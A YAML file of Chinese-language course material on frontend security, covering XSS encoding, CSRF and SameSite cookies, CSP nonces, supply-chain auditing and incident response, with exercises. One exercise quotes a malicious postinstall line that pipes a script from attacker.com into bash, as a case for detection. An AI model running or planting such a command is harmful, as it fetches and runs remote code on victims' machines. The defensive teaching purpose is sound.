@@ -1,0 +1,144 @@
+learning_targets:
+- 理解 XSS 攻击的三大分类（存储型、反射型、DOM-based）成因及防御核心：上下文感知的输出编码
+- 掌握 HTML/Attribute/JS/URL/CSS 五大编码上下文的差异与对应转义策略，会用 DOMPurify 与 Trusted Types 实施白名单清洗
+- 理解 CSRF 攻击原理与 SameSite Cookie（Strict/Lax/None）的防御边界，能实现双重提交令牌模式作为兜底
+- 掌握 CSP 3 核心指令（nonce、strict-dynamic、report-uri）配置方法，能制定灰度上线策略并处理第三方脚本兼容
+- 建立前端供应链安全意识：会接入依赖审计、锁文件版本固化、恶意包行为检测与 SBOM 生成的 CI/CD 门禁
+- 能产出《前端安全开发规范》《安全编码 Checklist》《漏洞分级与响应流程》，接入 SDL 全生命周期管理体系
+concept_map:
+- 前端安全体系 (第 9 章)
+- ├── XSS 攻防全景
+- │   ├── 三大分类：存储型 / 反射型 / DOM-based  —— P001
+- │   ├── 五大编码上下文：HTML / Attribute / JS / URL / CSS  —— P001
+- │   ├── 核心防御：输出编码 / DOMPurify 白名单 / Trusted Types 强制类型  —— P001
+- │   └── 纵深兜底：CSP 策略 / HttpOnly Cookie  —— P001, P003
+- ├── CSRF 与 SameSite Cookie
+- │   ├── 攻击链路：自动携带 Cookie 的跨站请求伪造  —— P002
+- │   ├── SameSite 属性：Strict / Lax(默认) / None+Secure  —— P002
+- │   ├── 双重提交令牌：Cookie/Header 同步校验模式  —— P002
+- │   └── 边界：子域共享 Cookie 失效 / 无状态 JWT 免疫  —— P002
+- ├── 内容安全策略 (CSP)
+- │   ├── 核心指令：script-src / style-src / connect-src / default-src 等  —— P003
+- │   ├── 现代模式：nonce-<base64> + 'strict-dynamic'  —— P003
+- │   ├── 部署策略：Report-Only 灰度 -> 强制模式 + report-uri 上报  —— P003
+- │   └── 兼容处理：哈希值回退 / 第三方脚本白名单 / 托管代理  —— P003
+- ├── 供应链安全
+- │   ├── 依赖审计：npm/pnpm/yarn audit + CI 门禁阈值  —— P004
+- │   ├── 锁文件完整性：package-lock.json / pnpm-lock.yaml 哈希锁定  —— P004
+- │   ├── 恶意包检测：Socket / Snyk / OSSF Scorecard 静态行为分析  —— P004
+- │   └── SBOM 生成：CycloneDX / SPDX 格式 @cyclonedx/bom / syft  —— P004
+- └── 安全基线与应急 SOP
+- '    ├── 三大清单：接入清单 / 编码清单 / 发布清单  —— P005'
+- '    ├── 自动化门禁：Husky 提交拦截 / CI 漏洞阻断 / CD 签名校验  —— P005'
+- '    ├── 监控告警：CSP 违规上报 / JS 异常激增 / 埋点异常 -> IM 告警  —— P005'
+- '    └── SDL 落地：需求评审 / 设计评审 / 编码规范 / 测试验收 / 发布上线 / 运维响应  —— P005'
+life_analogy:
+- 想象前端安全是一个**多层安检的机场航站楼**：
+- '- **XSS 防御 = 登机口安检（输出编码/Trusted Types）**：'
+- '  - 乘客(数据)在进入登机区(HTML/JS/CSS 执行上下文)前，必须通过金属探测门(上下文感知编码)，携带违禁品(脚本标签/事件处理器)直接拦截'
+- '  - VIP 通道(富文本/合法 HTML)需人工复核白名单(DOMPurify)，不能凭脸通关(正则自造)'
+- '- **CSRF 防御 = 登机牌+身份证双证核验（SameSite + CSRF Token）**：'
+- '  - SameSite=Lax 就像国内航班只验登机牌(同站请求自动带 Cookie)，国际航班(跨站 POST/AJAX)必须额外查护照(CSRF Token)'
+- '  - SameSite=None 就像过境免签，虽方便但必须加装 GPS 追踪器(双重令牌)防止劫持'
+- '- **CSP = 机场禁飞区与白名单机制**：'
+- '  - 明确规定只有持有当日动态通行证(nonce)的飞机(内联脚本)能起降，且只能按批准航线(strict-dynamic)飞行'
+- '  - 闯入者(内联事件/外部恶意脚本)直接被防空导弹(浏览器拦截)击落，并上报空管中心(report-uri)'
+- '- **供应链安全 = 行李传送带全程 X 光+封条（依赖审计+锁文件+SBOM）**：'
+- '  - 每件行李(依赖包)入场必扫描已知威胁库(advisory DB)，可疑行为(网络请求/混淆代码)直接剔除'
+- '  - 给每件行李加防拆封条(lockfile 哈希)，目的地核对清单(SBOM)防止掉包'
+- '- **安全基线与 SOP = 机场标准化运行手册与应急预案**：'
+- '  - 每日例检(CI 门禁)、突发事件分级响应(P0 停航/P1 备降/P2 记录)、事后复盘更新手册(RCA)'
+- '  - 新航线(新业务/新技术栈)开通前必须走审批流程，不可凭经验‘野蛮生长’'
+summary:
+- concept: XSS (跨站脚本攻击)
+  desc: 恶意脚本注入受信网站，分存储型/反射型/DOM-based，核心防御是上下文感知输出编码
+- concept: 五大编码上下文
+  desc: HTML/Attribute/JS/URL/CSS 编码互不通用，必须匹配输出位置，OWASP 首选输出编码而非输入过滤
+- concept: DOMPurify / Trusted Types
+  desc: 富文本场景白名单清洗库 / W3C 标准强制敏感 DOM API 仅接受 TrustedHTML 类型，从类型系统根治 XSS
+- concept: CSRF (跨站请求伪造)
+  desc: 利用浏览器自动携带 Cookie 特性伪造用户操作，SameSite=Lax 可拦截 90%+ 跨站 POST/AJAX
+- concept: SameSite Cookie
+  desc: Strict(全禁)/Lax(默认,允许顶级 GET)/None+Secure(跨站需双重令牌)，子域共享时失效
+- concept: 双重提交令牌
+  desc: 后端生成 Token -> 前端读取回传 Header/Body -> 后端校验一致性，不依赖 SameSite 的兜底方案
+- concept: CSP 3 (内容安全策略)
+  desc: 通过 HTTP Header 显式声明合法代码来源，核心模式 `script-src 'nonce-xxx' 'strict-dynamic'` 彻底禁用内联脚本
+- concept: CSP 部署策略
+  desc: Report-Only 灰度收集违规 -> 修正误报 -> 切换强制模式，配合 report-uri 实时监控攻击
+- concept: 供应链安全
+  desc: 守住 node_modules 后门：依赖审计 + 锁文件哈希锁版 + 恶意包行为检测 + SBOM 物料清单合规交付
+- concept: SBOM (软件物料清单)
+  desc: 记录所有直接/间接依赖的名称、版本、哈希、许可证，格式 CycloneDX/SPDX，用于漏洞溯源与合规
+- concept: 安全基线清单
+  desc: 接入/编码/发布三大清单标准化，接入 SDL 全生命周期，CI/CD 自动化门禁阻断高危变更
+- concept: 应急响应 SOP
+  desc: P0/P1/P2 分级响应：溯源取证 -> 热修复/回滚 -> 事后 RCA 复盘 -> 补全规范与测试用例
+exercises:
+- 'no': 1
+  title: XSS 上下文编码实战
+  contents:
+  - 场景：用户输入 `name` 将在以下 4 个位置渲染，请分别写出必须使用的编码函数或安全属性（伪代码即可）：
+  - 1. `<div class="username">{{name}}</div>`  —— HTML 文本节点
+  - 2. `<input value="{{name}}" />`  —— HTML 属性值 (双引号包裹)
+  - 3. `<a href="/search?q={{name}}">搜索</a>`  —— URL 查询参数
+  - 4. `<script>const user = '{{name}}';</script>`  —— JavaScript 字符串字面量
+  - 回答问题：
+  - '- 为什么不能统一用 `encodeURIComponent` 处理以上所有场景？'
+  - '- 若第 3 处改为 `<a href="javascript:search(''{{name}}'')">`，编码策略需如何变更？'
+  - '- React JSX / Vue 模板默认帮你做了哪些场景的转义？还有哪些『逃逸口』需手动处理？'
+- 'no': 2
+  title: CSP 策略调试与 nonce 注入
+  contents:
+  - 给定一个 Vue 3 + Vite 单页应用，需部署严格 CSP：仅允许同源脚本、样式、图片；允许连接 `https://api.example.com`；禁止内联脚本/样式、eval、object、frame；违规上报至
+    `/csp-report`。
+  - 任务：
+  - 1. 写出完整的 `Content-Security-Policy` Header 值（使用 nonce + strict-dynamic 模式）。
+  - 2. 说明 Vite 构建时如何自动给入口 `<script>` 与内联 `<style>` 注入 `nonce` 属性（提示：`vite-plugin-csp-nonce`
+    或 `html-webpack-plugin` 思路）。
+  - 3. 第三方统计脚本 `https://hm.baidu.com/hm.js?xxx` 被 CSP 拦截，给出两种不降低安全等级的接入方案。
+  - 回答问题：
+  - '- 为何不推荐使用 `''sha256-...''` 哈希值替代 nonce？'
+  - '- 如果老版本浏览器不支持 `strict-dynamic`，CSP 会如何降级？如何兼容？'
+- 'no': 3
+  title: 供应链安全 CI 门禁设计
+  contents:
+  - 某 Monorepo 项目 (pnpm workspace) 包含 3 个子包，现需在 GitHub Actions 中建立供应链安全门禁：
+  - 任务：
+  - 1. 编写工作流步骤：安装依赖 -> 审计生产依赖 (高危以上阻断) -> 运行 Socket/Snyk 扫描 PR 变更依赖 -> 生成 CycloneDX
+    SBOM 上传为 Artifact。
+  - 2. `pnpm audit` 报告 `lodash@4.17.15` 存在原型链污染漏洞 (GHSA-xxxx)，但业务方称『暂无升级计划』，作为安全负责人你会如何处理？给出决策流程。
+  - 3. 新增依赖 `super-useful-lib@1.0.0`，其 `postinstall` 脚本包含 `curl http://attacker.com/steal.sh
+    | bash`，说明 Socket 静态分析如何在安装前识别并拦截该行为。
+  - 回答问题：
+  - '- `npm audit` 与 Socket 检测能力的本质区别是什么？'
+  - '- 为什么必须提交 `pnpm-lock.yaml` 到 Git？如果不提交会发生什么供应链风险？'
+- 'no': 4
+  title: CSRF 防御矩阵决策
+  contents:
+  - 某业务系统架构：主域 `app.example.com` (Cookie 认证)，子域 `api.example.com` (无状态 JWT Header
+    认证)，第三方支付 `pay.thirdparty.com` (需在 iframe 中嵌入，跨域 Cookie)。
+  - 请为每个场景选择最佳 CSRF 防御组合并说明理由：
+  - 1. `app.example.com` 内部的转账 POST 接口
+  - 2. `api.example.com` 的删除资源 DELETE 接口
+  - 3. `pay.thirdparty.com` 在 iframe 中发起的支付确认 POST 请求
+  - 回答问题：
+  - '- 为什么 `api.example.com` 用 JWT Header 天然免疫 CSRF？但引入了什么新风险？如何缓解？'
+  - '- `pay.thirdparty.com` 必须设置 `SameSite=None; Secure`，此时 SameSite 失效，靠什么兜底？'
+  - '- 如果 `app.example.com` 存在一个反射型 XSS，SameSite=Lax 和 CSRF Token 能否阻止攻击者发起转账？为什么？'
+- 'no': 5
+  title: 安全基线 Checklist 与应急演练
+  contents:
+  - 请为团队输出一份《前端安全编码 Checklist》（Markdown 表格形式），至少覆盖以下 5 类 15 条检查项：
+  - '- XSS 防御 (编码、富文本、Trusted Types)'
+  - '- CSRF 防御 (SameSite、Token、接口方法语义)'
+  - '- CSP 与响应头 (CSP、HSTS、COOP/COEP、Referrer-Policy)'
+  - '- 依赖与构建 (audit、lockfile、SBOM、Source Map 保护)'
+  - '- 业务逻辑 (敏感操作二次确认、URL 跳转白名单、错误信息脱敏)'
+  - ''
+  - 附加任务：设计一次『XSS 注入触发 CSP 上报』的应急演练脚本，包含：
+  - 1. 模拟攻击构造步骤
+  - 2. 监控告警触发条件 (如 5 分钟内 CSP 违规 > 10 次)
+  - 3. 现网定位与影响范围确认流程
+  - 4. 热修复方案对比：收紧 CSP 规则 vs 前端代码回滚 vs WAF 拦截，决策矩阵是什么？
+  - 5. 事后 RCA 模版关键字段
